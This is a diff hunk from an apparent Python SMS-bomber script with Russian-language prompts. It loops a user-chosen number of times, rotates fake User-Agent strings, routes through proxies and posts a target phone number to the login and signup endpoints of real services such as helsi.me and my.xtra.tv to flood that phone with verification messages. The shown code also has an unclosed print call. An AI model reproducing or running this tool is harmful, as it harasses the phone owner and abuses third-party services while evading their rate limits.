@@ -48,11 +48,11 @@ run = int(console.input('[green]Введите количество повтор
 #------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 for _ in track(range(run)):
  headers = {"User-Agent": fake_useragent.UserAgent().random}
-try:
-        requests.post("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, headers=headers, proxies=proxies)
-        print('helsi.me')
-except:
-        print('Не отправлено (helsi.me)'
+ try:
+         requests.post("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, headers=headers, proxies=proxies)
+         print('helsi.me')
+ except:
+         print('Не отправлено (helsi.me)'
  try:#ok
          requests.post("https://my.xtra.tv/api/signup?lang=uk", data={"phone": number}, headers=headers, proxies=proxies)
          print('my.xtra.tv')
